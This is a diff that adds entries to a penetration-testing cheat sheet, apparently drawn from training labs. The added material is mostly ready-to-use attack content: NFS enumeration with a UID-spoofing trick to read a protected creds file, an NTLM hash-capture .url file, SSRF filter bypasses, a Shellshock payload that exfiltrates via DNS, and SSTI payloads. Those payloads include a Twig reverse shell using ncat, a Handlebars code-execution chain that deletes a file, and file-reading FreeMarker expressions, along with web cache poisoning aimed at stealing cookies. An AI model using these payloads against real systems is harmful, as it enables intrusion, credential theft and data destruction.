@@ -4609,9 +4609,16 @@ cd cheatsheet-pentesting
   ```
 
 ### Database Vulnerabilities (DB)
-- **Database Vulnerability Example**:
+- **Database enmueration**:
   ```sql
-  SELECT * FROM users WHERE username = 'admin' AND password = 'password'
+  #Connecting to MariaDB
+  mysql --host=127.0.0.1 --port=13306 --user=wp -p
+  
+  # Displaying user grants
+  MariaDB [(none)]> SHOW Grants;
+  
+  #Showing all variables
+  MariaDB [(none)]> show variables;
   ```
 
 ### Directory Traversal (DIR)
@@ -5053,15 +5060,40 @@ curl http://192.168.1.33/dashboard.php?show=pending/../../../../../etc/passwd
   for i in range(0, len(str), n):
   	print "Str = Str + " + '"' + str[i:i+n] + '"'
   ```
-- **NFS Example**:
-  ```bash
-  mount -t nfs target:/path /mnt
-  ```
   
 ### Network File System (NFS)
 - **NFS Example**:
   ```bash
   mount -t nfs target:/path /mnt
+  ```
+- **Using nmap to identify hosts that have portmapper/rpcbind running**:
+  ```bash
+  nmap -v -p 111 10.11.1.1-254
+  ```
+- **Querying rpcbind in order to get registered services**:
+  ```bash
+  nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
+  ```
+- **Running all NSE scripts for NFS**:
+  ```bash
+  nmap -p 111 --script nfs* 10.11.1.72
+  ```
+- **Using mount to access the NFS share in Kali**:
+  ```bash
+  mkdir home
+  sudo mount -o nolock 10.11.1.72:/home ~/home/
+  cd home/ && ls
+
+  ```
+- **Accessing protected file in the shared home as the pwn user**:
+  ```bash
+  cd home --> cat creds.txt  Output: cat: creds.txt: Permission denied
+  sudo adduser pwn
+  sudo sed -i -e 's/1001/1014/g' /etc/passwd
+  cat /etc/passwd | grep pwn
+  su pwn
+  id
+  cat creds.txt
   ```
 
 ### OS command injection
@@ -5188,6 +5220,48 @@ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
   ```bash
   smbclient \\target\share
   ```
+- **SMB basic enumeration: Using nmap to scan for the NetBIOS service**:
+  ```bash
+  nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
+  ```
+- **#Using nbtscan to collect additional NetBIOS information**:
+  ```bash
+  sudo nbtscan -r 10.11.1.0/24
+  ```
+- **Using the nmap scripting engine to perform OS discovery**:
+  ```bash
+  nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
+
+  ```
+- **Determining whether a host is vulnerable to the MS08_067 vulnerability**:
+  ```bash
+  nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5
+  ```
+- **URI File Attack**:
+  ```bash
+  ┌──(kali㉿kali)-[~]
+  └─$ cat @hax.url 
+  [InternetShortcut]
+  URL=anything
+  WorkingDirectory=anything
+  IconFile=\\192.168.118.14\%USERNAME%.icon
+  IconIndex=1
+  
+  -->
+  ┌──(kali㉿kali)-[~]
+  └─$ sudo responder -I tap0 -v
+  ...
+  [+] Listening for events...
+  ...
+  
+  -->
+  smb: \> put @hax.url 
+  putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)
+  smb: \> quit
+  
+  --> 
+  get the hashes
+  ```
 
 ### Simple Mail Transfer Protocol (SMTP)
 - **SMTP Example**:
@@ -5304,11 +5378,112 @@ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
   ```bash
   curl -X POST http://target.com/api/v1/resource -d 'url=http://internal-server'
   ```
+- **Basic SSRF against the local server(Change any URL vaule to local values)**:
+  ```bash
+  API=http://localhost/admin/delete?username=carlos
+  ```
+- **Basic SSRF against another back-end system**:
+  ```bash
+  Intruder --> stockApi=http://192.168.0.§y§:8080/admin
+  API=http://192.168.0.240:8080/admin/delete?username=carlos
+  ```
+- **SSRF with blacklist-based input filter**:
+  ```bash
+  API=http://127.1/admin/delete?username=carlos
+  API=http://127.1/%2561dmin/delete?username=carlos
+  ```
+- **SSRF with filter bypass via open redirection vulnerability**:
+  ```bash
+  URL/product/nextProduct?currentProductId=1&path=/product?productId=2					//Entrypoint
+  API= /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos			//Manipulation
+  ```
+- **Blind SSRF with out-of-band detection**:
+  ```bash
+  Referer Header --> Collaborator DNS 
+  ```
+- **SSRF with whitelist-based input filter**:
+  ```bash
+  [curl -X POST http://target.com/api/v1/resource -d 'url=http://internal-server'](http://127.0.0.1/											//Does not work
+  http://username@stock.weliketoshop.net/									//Works, aber Append a # to the username and observe that the URL is now rejected
+  http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos				// It works..Double-URL encode the # to %2523)
+  ```
+- **Blind SSRF with Shellshock exploitation**:
+  ```bash
+  GET /product?productId=2 HTTP/1.1
+  Host: 0ade009804d9c672c0973f1000a70011.web-security-academy.net
+  Cookie: session=68HsKn4XtgnsWRp1leKOfwkIYVz5ctv6
+  ..
+  User-Agent: () { :; }; /usr/bin/nslookup $(whoami).nwn3o2b3c2kc4yi5aud1j1v7qywpkg85.oastify.com
+  Referer:http://192.168.0.§1§:8080
+  ```
+- **Using redirect techniques to bypass  this SSRF protection.**:
+  ```bash
+  1- Building the own server
+    from flask import Flask
+    app = Flask(__name__)
+    @app.route('/')
+    def home():
+      return redirect("http://127.0.0.1/secret", code=302)
+    app.run()
+  2- Tunnel to expose the local ip
+       npm install -g localtunnel
+       npx lt -p 5000
+  ```
 
 ### Server-Side Template Injection (SSTI)
 - **SSTI Example**:
   ```html
   {{ config }}
+  ```
+- **SSTI basich payloads**:
+  ```html
+  {7*7}
+  {{7*7}}
+  {{7*'7'}}
+  {{_self.env.registerUndefinedFilterCallback("exec")}}
+  {{_self.env.getFilter("id")}}
+  {{_self.env.registerUndefinedFilterCallback("exec")}}
+  {{_self.env.getFilter("ncat -e /bin/bash 192.168.120.51 1234")}}
+  <%= 7*7 %>											//ERB template
+  <%= system("whoami") %>										//ERB template
+  blog-post-author-display=user.name}}{{7*7}}							//Tornado template
+  blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('whoami')			//Tornado template
+  ${7*7}
+  ${foobar}											//Identify the template engine( FreeMarker) with error messages
+  <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }			//FreeMarker template
+  ${{<%[%'"}}%\											//Identify the template engine(Handlebars) with error messages
+
+  ```
+- **SSTI: server-side template injection well-known exploit**:
+  ```html
+  #Handlebars 
+  wrtz{{#with "s" as |string|}}
+    {{#with "e"}}
+        {{#with split as |conslist|}}
+            {{this.pop}}
+            {{this.push (lookup string.sub "constructor")}}
+            {{this.pop}}
+            {{#with string.split as |codelist|}}
+                {{this.pop}}
+                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+                {{this.pop}}
+                {{#each conslist}}
+                    {{#with (string.sub.apply 0 codelist)}}
+                        {{this}}
+                    {{/with}}
+                {{/each}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+  {{/with}}
+  0%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%6970%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b[URL-encoded]-->end
+  
+  ${{<%[%'"}}%\											//Identify the template engine(Django) with error messages
+  {% debug %}											//Django framework 
+  {{settings.SECRET_KEY}}										//Django framework 
+  
+  ${object.getClass()}
+  ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
   ```
 
 ### Symfony
@@ -5356,6 +5531,37 @@ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
 - **Web Cache Poisoning Example**:
   ```bash
   curl -H "X-Forwarded-For: 127.0.0.1" http://example.com/resource
+  ```
+- **Web Cache Poisoning- basic tricks to check**:
+  ```bash
+  - Change the URL PATH(f.e. ?asd=asd) and check the X-Cache header whether it is miss or hit.
+  - If not works, use the Origin header as a cache buster.
+  - Find a place where you can cache input to response. Try X-Forwarded-Host:example.com and check the response.
+  - Try to check cookies or other headers that return in the response (fehost=someString"-alert(1)-"someString).
+  - Try to change the request Path (GET /?evil='/><script>alert(1)</script>).
+  - Try to find other params with param miner.
+  - Inject the place with XSS or in the Exploit Server write alert(document.cookie) and bind the exploit URL to the cached response.
+  - Try to check with multiple headers:
+    - X-Forwarded-Scheme: nothttps
+    - X-Forwarded-Host:exploit-0a3700c604474181c08db80f01b10022.exploit-server.net
+  - Using an unknown Header (Param Miner, f.e., X-Host: World.com).
+  - If you're struggling, you can use the Pragma: x-get-cache-key header to display the cache key in the response. This applies to some of the other labs as well.
+  - Websites often exclude certain UTM analytics parameters from the cache key (utm_content).
+  - Web cache poisoning with an unkeyed header.
+
+  ```
+- **Web Cache Poisoning basic example**:
+  ```bash
+  Request:
+  GET / HTTP/1.1
+  Host: 0ab400e90374f20ec0ab2eac003d0023.web-security-academy.net
+  X-Forwarded-Host:exploit-0aba000c032af203c0e12e3f01fd002b.exploit-server.net
+  
+  Response:
+  X-Cache: hit
+   
+  Exploit Server:
+  alert(document.cookie)
   ```
 
 ### Wireless Vulnerabilities
